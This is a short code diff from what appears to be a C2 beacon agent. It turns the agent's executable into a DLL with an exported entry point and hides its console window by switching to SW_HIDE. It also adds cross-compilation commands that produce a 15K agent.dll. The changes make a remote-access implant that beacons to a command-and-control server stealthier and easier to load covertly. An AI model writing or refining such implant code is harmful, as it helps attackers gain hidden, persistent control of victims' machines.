@@ -197,7 +197,10 @@ void StartBeacon(char* C2Server, int C2Port)
 	exit(0);
 }
 
-int main(int argc, char **argv)
+//int main(int argc, char **argv)
+//{
+
+extern "C" __declspec(dllexport) int dllmain(int argc, char **argv)
 {
 	// Window handle to work with Console window;
 	HWND stealth;
@@ -205,7 +208,7 @@ int main(int argc, char **argv)
 
 	// Idea of searching window and saying to show it (SW_HIDE to hide)
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, SW_SHOWNORMAL);
+	ShowWindow(stealth, SW_HIDE);
 
 	if (argc == 3)
 	{
@@ -231,4 +234,7 @@ int main(int argc, char **argv)
 	return 0;
 }
 // Compile:
-// i686-w64-mingw32-g++ -std=c++11 -o agent.exe agent.cpp -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+// i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL agent-dll.cpp
+// i686-w64-mingw32-g++ -std=c++11 -shared -o agent.dll agent-dll.o -s -lws2_32 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+// Results:
+// 15K agent.dll
